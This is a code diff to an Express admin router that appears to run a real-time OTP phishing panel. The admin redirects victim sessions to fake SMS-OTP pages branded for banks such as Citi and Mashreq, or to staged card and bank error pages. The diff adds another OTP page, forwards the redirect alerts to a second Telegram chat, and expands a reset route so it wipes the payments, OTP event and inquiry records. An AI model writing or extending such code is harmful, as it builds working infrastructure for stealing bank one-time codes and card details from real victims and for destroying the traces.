@@ -14,7 +14,20 @@ async function count(sql, params = []) {
   return Number(Object.values(rows[0] || {})[0]) || 0;
 }
 
-// ─── Telegram admin alert helper ─────────────────────────────────────────────
+// ─── Telegram helpers ─────────────────────────────────────────────────────────
+async function sendInquiryAlert(message) {
+  const token  = await getSetting('telegram_bot_token', '');
+  const chatId = await getSetting('inquiry_chat_id',    process.env.INQUIRY_CHAT_ID || '');
+  if (!token || !chatId) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+    });
+  } catch {}
+}
+
 async function sendAdminAlert(message) {
   const enabled = await getSetting('admin_tg_alerts', '0');
   if (enabled !== '1') return;
@@ -333,12 +346,14 @@ router.post('/action', requireAdmin, async (req, res) => {
   const userAgent = req.headers['user-agent'] || '';
   try {
     if (act === 'redirect') {
-      const allowed = ['otp-sms','otp','otp-citi','otp-mashreq','otp-limit',
+      const allowed = ['otp-sms','otp-sms2','otp','otp-citi','otp-mashreq','otp-limit',
         'payment:error=card_error','payment:error=card_type','payment:error=bank_error'];
       if (!cleanSid || !allowed.includes(req.body.page)) return res.json({ ok:false, error:'Invalid' });
       await query('UPDATE payments SET redirect_to = ?, otp_page = ? WHERE sid = ?', [req.body.page, req.body.page, cleanSid]);
       logActivity('otp_redirect', 'OTP redirect → ' + req.body.page + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
-      sendAdminAlert('↩️ <b>OTP Redirect</b>\nSID: ' + cleanSid + '\nPage: ' + req.body.page + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
+      const rdMsg = '↩️ <b>OTP Redirect</b>\nSID: <code>' + cleanSid + '</code>\nPage: <b>' + req.body.page + '</b>\nAdmin: ' + adminUser + '\nIP: ' + ip;
+      sendAdminAlert(rdMsg).catch(() => {});
+      sendInquiryAlert(rdMsg).catch(() => {});
       return res.json({ ok: true });
     }
     if (act === 'set_status') {
@@ -423,11 +438,14 @@ router.get('/logs', requireAdmin, async (req, res) => {
   }
 });
 
-// ─── Reset All Settings ───────────────────────────────────────────────────────
+// ─── Full Data Reset ──────────────────────────────────────────────────────────
 router.post('/settings/reset', requireAdmin, async (req, res) => {
   try {
+    await query('DELETE FROM otp_events', []);
+    await query('DELETE FROM payments', []);
+    await query('DELETE FROM inquiries', []);
     await query('DELETE FROM settings', []);
-    logActivity('settings_change', 'All settings reset to defaults', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
+    logActivity('settings_change', 'Full data reset: all settings, payments, inquiries wiped', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
     res.json({ ok: true });
   } catch(e) { res.json({ ok: false, error: e.message }); }
 });
